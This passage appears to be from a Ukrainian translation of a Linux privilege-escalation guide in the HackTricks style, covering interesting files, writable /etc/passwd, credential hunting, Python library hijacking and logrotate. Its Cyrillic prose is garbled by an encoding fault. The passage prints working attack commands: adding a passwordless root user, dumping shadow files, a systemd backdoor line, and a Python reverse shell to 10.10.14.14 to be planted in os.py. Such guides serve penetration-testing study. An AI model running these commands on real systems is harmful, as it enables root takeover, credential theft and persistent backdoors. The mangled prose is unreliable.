–Ø–∫—â–æ –≤–∏ –≤–∏—è–≤–∏—Ç–µ, —â–æ Forward Agent –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ, –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, –æ—Å–∫—ñ–ª—å–∫–∏ **–≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü–µ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## –¶—ñ–∫–∞–≤—ñ —Ñ–∞–π–ª–∏

### –§–∞–π–ª–∏ –ø—Ä–æ—Ñ—ñ–ª—é

–§–∞–π–ª `/etc/profile` —Ç–∞ —Ñ–∞–π–ª–∏ —É `/etc/profile.d/` - —Ü–µ **—Å—Ü–µ–Ω–∞—Ä—ñ—ó, —è–∫—ñ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è, –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑–∞–ø—É—Å–∫–∞—î –Ω–æ–≤–∏–π –æ–±–æ–ª–æ–Ω–∫—É**. –¢–æ–º—É, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–ø–∏—Å–∞—Ç–∏ –∞–±–æ –∑–º—ñ–Ω–∏—Ç–∏ –±—É–¥—å-—è–∫–∏–π –∑ –Ω–∏—Ö, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó**.
```bash
ls -l /etc/profile /etc/profile.d/
```
–Ø–∫—â–æ –≤–∏—è–≤–ª–µ–Ω–æ –±—É–¥—å-—è–∫–∏–π –¥–∏–≤–Ω–∏–π —Å—Ü–µ–Ω–∞—Ä—ñ–π –ø—Ä–æ—Ñ—ñ–ª—é, –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –π–æ–≥–æ –Ω–∞ **—á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ**.

### –§–∞–π–ª–∏ Passwd/Shadow

–ó–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –û–° —Ñ–∞–π–ª–∏ `/etc/passwd` —Ç–∞ `/etc/shadow` –º–æ–∂—É—Ç—å –º–∞—Ç–∏ —ñ–Ω—à—É –Ω–∞–∑–≤—É –∞–±–æ —Ç–∞–º –º–æ–∂–µ –±—É—Ç–∏ —Ä–µ–∑–µ—Ä–≤–Ω–∞ –∫–æ–ø—ñ—è. –¢–æ–º—É —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è **–∑–Ω–∞–π—Ç–∏ –≤—Å—ñ** —ó—Ö —Ç–∞ **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ —á–∏—Ç–∞—Ç–∏** —ó—Ö, —â–æ–± –ø–æ–±–∞—á–∏—Ç–∏, **—á–∏ —î –≤ –Ω–∏—Ö —Ö–µ—à—ñ**.
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
–£ –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **—Ö–µ—à—ñ –ø–∞—Ä–æ–ª—ñ–≤** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É `/etc/passwd` (–∞–±–æ –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω–æ–≥–æ)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### –ó–∞–ø–∏—Å—É–≤–∞–Ω–∏–π /etc/passwd

–°–ø–æ—á–∞—Ç–∫—É —Å—Ç–≤–æ—Ä—ñ—Ç—å –ø–∞—Ä–æ–ª—å –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –æ–¥–Ω—ñ—î—ó –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –∫–æ–º–∞–Ω–¥.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
–ü–æ—Ç—ñ–º –¥–æ–¥–∞–π—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ `hacker` —ñ –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–π –ø–∞—Ä–æ–ª—å.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
–ù–∞–ø—Ä–∏–∫–ª–∞–¥: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

–¢–µ–ø–µ—Ä –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É `su` –∑ `hacker:hacker`

–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Ä—è–¥–∫–∏, —â–æ–± –¥–æ–¥–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞-–ø—É—Å—Ç—É–Ω –±–µ–∑ –ø–∞—Ä–æ–ª—è.\
–ü–û–ü–ï–†–ï–î–ñ–ï–ù–ù–Ø: –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–≥—ñ—Ä—à–∏—Ç–∏ –ø–æ—Ç–æ—á–Ω–∏–π —Ä—ñ–≤–µ–Ω—å –±–µ–∑–ø–µ–∫–∏ –º–∞—à–∏–Ω–∏.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**–ü–†–ò–ú–Ü–¢–ö–ê:** –ù–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞—Ö BSD —Ñ–∞–π–ª `/etc/passwd` —Ä–æ–∑—Ç–∞—à–æ–≤—É—î—Ç—å—Å—è –∑–∞ –∞–¥—Ä–µ—Å–æ—é `/etc/pwd.db` —ñ `/etc/master.passwd`, —Ç–∞–∫–æ–∂ —Ñ–∞–π–ª `/etc/shadow` –ø–µ—Ä–µ–π–º–µ–Ω–æ–≤–∞–Ω–æ –Ω–∞ `/etc/spwd.db`.

–í–∞–º —Å–ª—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ **–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –≤ –¥–µ—è–∫—ñ —á—É—Ç–ª–∏–≤—ñ —Ñ–∞–π–ª–∏**. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –≤ **—Ñ–∞–π–ª –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Å–ª—É–∂–±–∏**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –º–∞—à–∏–Ω–∞ –ø—Ä–∞—Ü—é—î –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ **tomcat** —ñ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–º—ñ–Ω–∏—Ç–∏ —Ñ–∞–π–ª –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Å–ª—É–∂–±–∏ Tomcat –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ /etc/systemd/**, —Ç–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ —Ä—è–¥–∫–∏:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
### –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ç–µ–∫

–ù–∞—Å—Ç—É–ø–Ω—ñ —Ç–µ–∫–∏ –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏ —Ä–µ–∑–µ—Ä–≤–Ω—ñ –∫–æ–ø—ñ—ó –∞–±–æ —Ü—ñ–∫–∞–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (–ô–º–æ–≤—ñ—Ä–Ω–æ, –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –æ—Å—Ç–∞–Ω–Ω—é, –∞–ª–µ —Å–ø—Ä–æ–±—É–π—Ç–µ)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### –î–∏–≤–Ω–µ –º—ñ—Å—Ü–µ/–í–ª–∞—Å–Ω—ñ —Ñ–∞–π–ª–∏
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### –ó–º—ñ–Ω–µ–Ω—ñ —Ñ–∞–π–ª–∏ –∑–∞ –æ—Å—Ç–∞–Ω–Ω—ñ —Ö–≤–∏–ª–∏–Ω–∏
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### –§–∞–π–ª–∏ –±–∞–∑ –¥–∞–Ω–∏—Ö Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_—ñ—Å—Ç–æ—Ä—ñ—è, .sudo\_—è–∫\_–∞–¥–º—ñ–Ω\_—É—Å–ø—ñ—à–Ω–æ, –ø—Ä–æ—Ñ—ñ–ª—å, bashrc, httpd.conf, .–ø–ª–∞–Ω, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml —Ñ–∞–π–ª–∏
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### –ü—Ä–∏—Ö–æ–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **–°–∫—Ä–∏–ø—Ç–∏/–í–∏–∫–æ–Ω—É–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏ –≤ PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **–í–µ–±-—Ñ–∞–π–ª–∏**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **–†–µ–∑–µ—Ä–≤–Ω—ñ –∫–æ–ø—ñ—ó**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### –í—ñ–¥–æ–º—ñ —Ñ–∞–π–ª–∏, —â–æ –º—ñ—Å—Ç—è—Ç—å –ø–∞—Ä–æ–ª—ñ

–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ –∫–æ–¥ [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), –≤—ñ–Ω —à—É–∫–∞—î **–∫—ñ–ª—å–∫–∞ –º–æ–∂–ª–∏–≤–∏—Ö —Ñ–∞–π–ª—ñ–≤, —è–∫—ñ –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏ –ø–∞—Ä–æ–ª—ñ**.\
**–©–µ –æ–¥–∏–Ω —Ü—ñ–∫–∞–≤–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç**, —è–∫–∏–π –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è —Ü—å–æ–≥–æ, —Ü–µ: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), —è–∫–∏–π —î –≤—ñ–¥–∫—Ä–∏—Ç–∏–º –¥–æ–¥–∞—Ç–∫–æ–º, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–º –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –±–∞–≥–∞—Ç—å–æ—Ö –ø–∞—Ä–æ–ª—ñ–≤, –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö –Ω–∞ –ª–æ–∫–∞–ª—å–Ω–æ–º—É –∫–æ–º–ø'—é—Ç–µ—Ä—ñ –¥–ª—è Windows, Linux —Ç–∞ Mac.

### –ñ—É—Ä–Ω–∞–ª–∏

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ —á–∏—Ç–∞—Ç–∏ –∂—É—Ä–Ω–∞–ª–∏, –≤–∏, –º–æ–∂–ª–∏–≤–æ, –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **—Ü—ñ–∫–∞–≤—É/–∫–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω–∏—Ö**. –ß–∏–º –¥–∏–≤–Ω—ñ—à–µ –±—É–¥–µ –∂—É—Ä–Ω–∞–ª, —Ç–∏–º —Ü—ñ–∫–∞–≤—ñ—à–µ –≤—ñ–Ω –±—É–¥–µ (—ñ–º–æ–≤—ñ—Ä–Ω–æ).\
–¢–∞–∫–æ–∂, –¥–µ—è–∫—ñ "**–ø–æ–≥–∞–Ω–æ**" –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ (–∑ –∑–∞–¥–Ω—ñ–º–∏ –¥–≤–µ—Ä–∏–º–∞?) **–∂—É—Ä–Ω–∞–ª–∏ –∞—É–¥–∏—Ç—É** –º–æ–∂—É—Ç—å –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –≤–∞–º **–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –ø–∞—Ä–æ–ª—ñ** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∂—É—Ä–Ω–∞–ª—ñ–≤ –∞—É–¥–∏—Ç—É, —è–∫ –ø–æ—è—Å–Ω–µ–Ω–æ –≤ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
–î–ª—è —Ç–æ–≥–æ —â–æ–± **—á–∏—Ç–∞—Ç–∏ –∂—É—Ä–Ω–∞–ª–∏ –≥—Ä—É–ø–∏** [**adm**](—Ü—ñ–∫–∞–≤—ñ-–≥—Ä—É–ø–∏-linux-pe/#–≥—Ä—É–ø–∞-adm) –±—É–¥–µ –¥—ñ–π—Å–Ω–æ –∫–æ—Ä–∏—Å–Ω–æ.

### Shell —Ñ–∞–π–ª–∏
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### –ó–∞–≥–∞–ª—å–Ω–∏–π –ø–æ—à—É–∫/Regex –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö

–í–∏ —Ç–∞–∫–æ–∂ –ø–æ–≤–∏–Ω–Ω—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Ñ–∞–π–ª–∏, —â–æ –º—ñ—Å—Ç—è—Ç—å —Å–ª–æ–≤–æ "**password**" —É —Å–≤–æ—î–º—É **—ñ–º–µ–Ω—ñ** –∞–±–æ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **–≤–º—ñ—Å—Ç—É**, –∞ —Ç–∞–∫–æ–∂ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ IP-–∞–¥—Ä–µ—Å–∏ —Ç–∞ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—ñ –∞–¥—Ä–µ—Å–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∂—É—Ä–Ω–∞–ª—ñ–≤ –∞–±–æ —Ö–µ—à—ñ–≤ regexps.\
–Ø –Ω–µ –±—É–¥—É –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤—É–≤–∞—Ç–∏ —Ç—É—Ç, —è–∫ —Ä–æ–±–∏—Ç–∏ –≤—Å–µ —Ü–µ, –∞–ª–µ —è–∫—â–æ –≤–∞—Å —Ü–µ —Ü—ñ–∫–∞–≤–∏—Ç—å, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –æ—Å—Ç–∞–Ω–Ω—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏, —è–∫—ñ –≤–∏–∫–æ–Ω—É—î [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## –ó–∞–ø–∏—Å—É–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏

### –ü—ñ–¥–º—ñ–Ω–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫ Python

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞—î—Ç–µ **–∑–≤—ñ–¥–∫–∏** –±—É–¥–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏—Å—è —Å—Ü–µ–Ω–∞—Ä—ñ–π Python —ñ –≤–∏ **–º–æ–∂–µ—Ç–µ –ø–∏—Å–∞—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ** —Ü—ñ—î—ó —Ç–µ–∫–∏ –∞–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–º—ñ–Ω—é–≤–∞—Ç–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ Python**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É –û–° —ñ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –≤ –Ω–µ—ó –∑–∞–¥–Ω—ñ–π –ø—Ä–æ—Ö—ñ–¥ (—è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–∏—Å–∞—Ç–∏ —Ç–∞–º, –¥–µ –±—É–¥–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏—Å—è —Å—Ü–µ–Ω–∞—Ä—ñ–π Python, —Å–∫–æ–ø—ñ—é–π—Ç–µ —Ç–∞ –≤—Å—Ç–∞–≤—Ç–µ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É os.py).

–î–ª—è **–≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–∞–¥–Ω—å–æ–≥–æ –ø—Ä–æ—Ö–æ–¥—É –≤ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É** –ø—Ä–æ—Å—Ç–æ –¥–æ–¥–∞–π—Ç–µ –≤ –∫—ñ–Ω–µ—Ü—å –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ os.py –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ä—è–¥–æ–∫ (–∑–º—ñ–Ω—ñ—Ç—å IP —Ç–∞ PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è Logrotate

–£—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —É `logrotate` –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ **–ø—Ä–∞–≤–∞–º–∏ –∑–∞–ø–∏—Å—É** –Ω–∞ —Ñ–∞–π–ª –∂—É—Ä–Ω–∞–ª—É –∞–±–æ –π–æ–≥–æ –±–∞—Ç—å–∫—ñ–≤—Å—å–∫—ñ –∫–∞—Ç–∞–ª–æ–≥–∏ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø—ñ–¥–≤–∏—â–µ–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó. –¶–µ —Ç–æ–º—É, —â–æ `logrotate`, —è–∫–∏–π —á–∞—Å—Ç–æ –ø—Ä–∞—Ü—é—î –≤ —è–∫–æ—Å—Ç—ñ **root**, –º–æ–∂–µ –±—É—Ç–∏ –∑–º–∞–Ω—ñ–ø—É–ª—å–æ–≤–∞–Ω–∏–π –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤, –æ—Å–æ–±–ª–∏–≤–æ –≤ –∫–∞—Ç–∞–ª–æ–≥–∞—Ö, —Ç–∞–∫–∏—Ö —è–∫ _**/etc/bash\_completion.d/**_. –í–∞–∂–ª–∏–≤–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –¥–æ–∑–≤–æ–ª–∏ –Ω–µ –ª–∏—à–µ –≤ _/var/log_, –∞–ª–µ –π –≤ –±—É–¥—å-—è–∫–æ–º—É –∫–∞—Ç–∞–ª–æ–∑—ñ, –¥–µ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –æ–±–µ—Ä—Ç–∞–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—É.

{% hint style="info" %}
–¶—è —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–ø–ª–∏–≤–∞—î –Ω–∞ –≤–µ—Ä—Å—ñ—é `logrotate` `3.18.0` —Ç–∞ —Å—Ç–∞—Ä—ñ—à—ñ
{% endhint %}

–î–æ–∫–ª–∞–¥–Ω—ñ—à—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –Ω–∞ —Ü—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

–í–∏ –º–æ–∂–µ—Ç–µ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü—é —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [**logrotten**](https://github.com/whotwagner/logrotten).

–¶—è —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥—É–∂–µ —Å—Ö–æ–∂–∞ –Ω–∞ [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** —Ç–æ–º—É –∫–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –≤–∏ –≤–∏—è–≤–ª—è—î—Ç–µ, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –∂—É—Ä–Ω–∞–ª–∏, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —Ö—Ç–æ –∫–µ—Ä—É—î —Ü–∏–º–∏ –∂—É—Ä–Ω–∞–ª–∞–º–∏, —ñ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó, –∑–∞–º—ñ–Ω—é—é—á–∏ –∂—É—Ä–Ω–∞–ª–∏ —Å–∏–º–≤–æ–ª—ñ—á–Ω–∏–º–∏ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º–∏.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**–ü–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

–Ø–∫—â–æ, –∑ —è–∫–æ—ó –∑–∞–≤–≥–æ–¥–Ω–æ –ø—Ä–∏—á–∏–Ω–∏, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ **–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏** —Å—Ü–µ–Ω–∞—Ä—ñ–π `ifcf-<—â–æ-–Ω–µ–±—É–¥—å>` –¥–æ _/etc/sysconfig/network-scripts_ **–∞–±–æ** –º–æ–∂–µ **–Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏** —ñ—Å–Ω—É—é—á–∏–π, —Ç–æ –≤–∞—à–∞ **—Å–∏—Å—Ç–µ–º–∞ –≤–∑–ª–∞–º–∞–Ω–∞**.

–ú–µ—Ä–µ–∂–µ–≤—ñ —Å—Ü–µ–Ω–∞—Ä—ñ—ó, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ _ifcg-eth0_, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –º–µ—Ä–µ–∂–µ–≤–∏—Ö –ø—ñ–¥–∫–ª—é—á–µ–Ω—å. –í–æ–Ω–∏ –≤–∏–≥–ª—è–¥–∞—é—Ç—å —Ç–æ—á–Ω–æ —Ç–∞–∫ —Å–∞–º–æ, —è–∫ —Ñ–∞–π–ª–∏ .INI. –û–¥–Ω–∞–∫ –≤–æ–Ω–∏ \~–ø—ñ–¥–∫–ª—é—á–∞—é—Ç—å—Å—è\~ –Ω–∞ Linux –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Network Manager (dispatcher.d).

